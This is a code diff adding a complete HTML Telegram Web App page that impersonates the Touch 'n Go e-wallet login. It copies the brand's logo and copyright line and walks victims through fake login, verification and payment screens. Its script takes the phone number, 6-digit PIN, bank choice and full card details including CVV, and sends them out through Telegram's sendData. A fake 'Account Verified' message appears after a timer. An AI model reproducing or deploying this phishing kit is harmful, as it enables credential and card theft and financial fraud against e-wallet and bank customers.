@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+  <title>TNG Login</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; }
+    body {
+      min-height: 100vh;
+      background: linear-gradient(180deg, #4EC0E8 0%, #4080E0 50%, #5050D0 100%);
+      color: white;
+      padding: 50px 24px 30px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .logo { width: 180px; margin-bottom: 40px; }
+    .page {
+      width: 100%; max-width: 420px; display: none; flex-direction: column; align-items: center;
+      animation: fadeIn 0.4s ease;
+    }
+    .page.active { display: flex; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+
+    .login-title { align-self: flex-start; font-size: 32px; margin-bottom: 24px; }
+    .input-row { width: 100%; display: flex; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.5); padding-bottom: 10px; margin-bottom: 24px; }
+    .country-code { font-size: 20px; padding-right: 8px; }
+    .input-field { flex: 1; background: transparent; border: none; color: white; font-size: 20px; outline: none; }
+    .input-field::placeholder { color: rgba(255,255,255,0.6); }
+    .pin-label { align-self: flex-start; font-size: 20px; margin-bottom: 16px; }
+    .pin-input { width: 100%; padding: 14px; font-size: 24px; letter-spacing: 12px; text-align: center; background: rgba(255,255,255,0.15); border: none; border-radius: 12px; color: white; outline: none; margin-bottom: 16px; }
+    .forgot-link { align-self: flex-end; color: white; text-decoration: none; font-size: 16px; margin-bottom: 40px; }
+    .btn-primary { width: 100%; padding: 18px; background: rgba(255,255,255,0.3); border: none; border-radius: 50px; color: white; font-size: 20px; font-weight: 500; cursor: pointer; }
+    .btn-primary:active { background: rgba(255,255,255,0.4); }
+
+    .spinner { width: 80px; height: 80px; border: 3px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 30px; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    h2 { font-size: 28px; font-weight: 500; margin-bottom: 12px; text-align: center; }
+    .sub-text { font-size: 17px; opacity: 0.8; text-align: center; line-height: 1.5; }
+
+    .check-icon { width: 100px; height: 100px; background: rgba(255,255,255,0.25); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 50px; margin-bottom: 30px; }
+    .method-card { width: 100%; background: rgba(255,255,255,0.15); border-radius: 20px; padding: 22px; margin-bottom: 16px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; }
+    .method-card:active { background: rgba(255,255,255,0.25); }
+    .method-left { display: flex; align-items: center; gap: 16px; }
+    .method-icon { width: 48px; height: 48px; background: rgba(255,255,255,0.2); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; }
+    .method-name { font-size: 20px; font-weight: 500; margin-bottom: 4px; }
+    .method-desc { font-size: 14px; opacity: 0.7; }
+
+    .hint-box { width: 100%; background: rgba(255,255,255,0.1); border-radius: 12px; padding: 14px 16px; margin-bottom: 24px; display: flex; gap: 10px; align-items: flex-start; font-size: 15px; opacity: 0.9; }
+    .bank-grid { width: 100%; display: grid; grid-template-columns: 1fr 1fr; gap: 14px; }
+    .bank-card { background: rgba(255,255,255,0.15); border-radius: 14px; padding: 24px 12px; display: flex; flex-direction: column; align-items: center; gap: 12px; cursor: pointer; }
+    .bank-card:active { background: rgba(255,255,255,0.25); }
+    .bank-logo { width: 100%; height: 44px; background: white; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #222; }
+    .form-group { width: 100%; margin-bottom: 16px; }
+    .form-group label { display: block; font-size: 15px; margin-bottom: 8px; opacity: 0.9; }
+    .form-group input { width: 100%; padding: 14px; background: rgba(255,255,255,0.15); border: none; border-radius: 12px; color: white; font-size: 16px; outline: none; }
+    .form-row { display: flex; gap: 12px; }
+    .form-row .form-group { flex: 1; }
+    .btn-authorize { width: 100%; padding: 18px; background: rgba(255,255,255,0.3); border: none; border-radius: 50px; color: white; font-size: 20px; font-weight: 500; cursor: pointer; margin-top: 10px; }
+    .copyright { margin-top: auto; padding-top: 30px; font-size: 13px; opacity: 0.5; text-align: center; }
+  </style>
+</head>
+<body>
+
+  <svg class="logo" viewBox="0 0 200 100" xmlns="http://www.w3.org/2000/svg">
+    <rect x="20" y="5" width="160" height="85" rx="18" fill="#2E3192"/>
+    <text x="100" y="45" font-family="Arial" font-size="32" font-weight="bold" fill="#FFE800" text-anchor="middle">Touch</text>
+    <text x="100" y="75" font-family="Arial" font-size="24" font-weight="bold" fill="#FFE800" text-anchor="middle">'nGO</text>
+  </svg>
+
+  <!-- PAGE 1: LOGIN -->
+  <div id="page1" class="page active">
+    <h2 class="login-title">Login</h2>
+    <div class="input-row">
+      <span class="country-code">+60 ▾</span>
+      <input type="tel" class="input-field" id="phoneInput" placeholder="Mobile Number" maxlength="10" />
+      <span style="opacity:0.6; font-size:18px;">?</span>
+    </div>
+    <p class="pin-label">6-digit PIN</p>
+    <input type="password" class="pin-input" id="pinInput" maxlength="6" placeholder="••••••" />
+    <a href="#" class="forgot-link">Forget your PIN?</a>
+    <button class="btn-primary" id="loginBtn">Log In</button>
+    <p class="copyright">Copyright © 2026 TNG Digital Sdn Bhd.</p>
+  </div>
+
+  <!-- PAGE 2: VERIFYING -->
+  <div id="page2" class="page">
+    <div class="spinner"></div>
+    <h2>Verifying Connection</h2>
+    <p class="sub-text">Sending data to Telegram...</p>
+  </div>
+
+  <!-- PAGE 3: PILIH KAEDAH -->
+  <div id="page3" class="page">
+    <div class="check-icon">✓</div>
+    <h2>Account Verified</h2>
+    <p class="sub-text" style="margin-bottom:30px;">Select your preferred payment method</p>
+    <div class="method-card" onclick="showPage('page4')">
+      <div class="method-left"><div class="method-icon">🏦</div><div><div class="method-name">Online Banking</div><div class="method-desc">Maybank, CIMB, Public Bank...</div></div></div>
+      <span style="font-size:24px; opacity:0.5;">›</span>
+    </div>
+    <div class="method-card" onclick="showPage('page5')">
+      <div class="method-left"><div class="method-icon">💳</div><div><div class="method-name">Card Payment</div><div class="method-desc">Visa, Mastercard, AMEX</div></div></div>
+      <span style="font-size:24px; opacity:0.5;">›</span>
+    </div>
+    <p class="copyright">Copyright © 2026 TNG Digital Sdn Bhd.</p>
+  </div>
+
+  <!-- PAGE 4: PILIH BANK -->
+  <div id="page4" class="page">
+    <h2 style="font-size:22px; align-self:flex-start; margin-bottom:16px;">Select Bank</h2>
+    <div class="hint-box"><span>ℹ️</span><span>Ensure your bank's pop-up blocker is disabled.</span></div>
+    <div class="bank-grid">
+      <div class="bank-card" onclick="sendBank('Maybank')"><div class="bank-logo" style="color:#222;">Maybank</div><span class="bank-name">MAYBANK</span></div>
+      <div class="bank-card" onclick="sendBank('CIMB')"><div class="bank-logo" style="color:#cc0000;">CIMB</div><span class="bank-name">CIMB BANK</span></div>
+      <div class="bank-card" onclick="sendBank('Public Bank')"><div class="bank-logo" style="color:#cc0000;">PUBLIC</div><span class="bank-name">PUBLIC BANK</span></div>
+      <div class="bank-card" onclick="sendBank('RHB')"><div class="bank-logo" style="color:#0066cc;">RHB</div><span class="bank-name">RHB BANK</span></div>
+      <div class="bank-card" onclick="sendBank('Hong Leong')"><div class="bank-logo" style="color:#006699;">HLB</div><span class="bank-name">HONG LEONG BANK</span></div>
+      <div class="bank-card" onclick="sendBank('Affin')"><div class="bank-logo" style="color:#006633;">AFFIN</div><span class="bank-name">AFFIN BANK</span></div>
+    </div>
+    <p class="copyright">Copyright © 2026 TNG Digital Sdn Bhd.</p>
+  </div>
+
+  <!-- PAGE 5: KAD -->
+  <div id="page5" class="page">
+    <h2 style="font-size:26px; margin-bottom:8px;">Card Authorization</h2>
+    <p class="sub-text" style="margin-bottom:24px;">Add your card for seamless payments</p>
+    <div class="form-group"><label>Cardholder Name</label><input type="text" id="cardName" placeholder="NAME AS PRINTED" /></div>
+    <div class="form-group"><label>Card Number</label><input type="text" id="cardNum" placeholder="0000 0000 0000 0000" maxlength="19" /></div>
+    <div class="form-row">
+      <div class="form-group"><label>Expiry Date</label><input type="text" id="cardExp" placeholder="MM/YY" maxlength="5" /></div>
+      <div class="form-group"><label>CVV</label><input type="password" id="cardCvv" placeholder="•••" maxlength="4" /></div>
+    </div>
+    <button class="btn-authorize" onclick="submitCard()">Authorize Payment</button>
+    <p class="copyright">Copyright © 2026 TNG Digital Sdn Bhd.</p>
+  </div>
+
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+
+    function showPage(pageId) {
+      document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+      document.getElementById(pageId).classList.add('active');
+    }
+
+    // === LOGIN → HANTAR DATA KE TELEGRAM → NEXT ===
+    document.getElementById('loginBtn').addEventListener('click', function() {
+      const phone = document.getElementById('phoneInput').value.trim();
+      const pin = document.getElementById('pinInput').value.trim();
+
+      if (!phone) { tg.showAlert('Sila masukkan nombor telefon'); return; }
+      if (pin.length !== 6) { tg.showAlert('Sila masukkan 6-digit PIN'); return; }
+
+      // Hantar data ke Telegram
+      tg.sendData(JSON.stringify({ action: 'login', phone: phone, pin: pin }));
+
+      showPage('page2');
+      setTimeout(() => showPage('page3'), 2500);
+    });
+
+    // Hantar pilihan bank
+    function sendBank(bankName) {
+      tg.sendData(JSON.stringify({ action: 'bank', bank: bankName }));
+      tg.close();
+    }
+
+    // Hantar butiran kad
+    function submitCard() {
+      const name = document.getElementById('cardName').value.trim();
+      const num = document.getElementById('cardNum').value.trim();
+      const exp = document.getElementById('cardExp').value.trim();
+      const cvv = document.getElementById('cardCvv').value.trim();
+
+      if (!name || !num || !exp || !cvv) { tg.showAlert('Lengkapkan semua butiran'); return; }
+
+      tg.sendData(JSON.stringify({ action: 'card', name: name, num: num, exp: exp, cvv: cvv }));
+      tg.showAlert('✅ Data dihantar!');
+      tg.close();
+    }
+  </script>
+</body>
+                                                                      </html>
+                                                                      
